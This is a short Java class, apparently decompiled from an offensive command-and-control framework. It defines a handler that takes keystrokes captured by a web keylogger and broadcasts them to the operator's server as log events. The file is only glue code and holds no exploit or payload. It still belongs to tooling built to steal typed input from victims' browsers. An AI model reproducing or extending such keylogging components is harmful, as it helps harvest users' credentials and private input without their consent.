package server;

import cloudstrike.Keylogger;
import common.WebKeyloggerEvent;
import java.util.Map;

public class KeyloggerHandler implements Keylogger.KeyloggerListener {
   protected Resources resources;
   protected String curl;

   public KeyloggerHandler(Resources var1, String var2) {
      this.resources = var1;
      this.curl = var2;
   }

   public void slowlyStrokeMe(String var1, String var2, Map var3, String var4) {
      this.resources.broadcast("weblog", new WebKeyloggerEvent(this.curl, var2, var3, var4));
   }
}
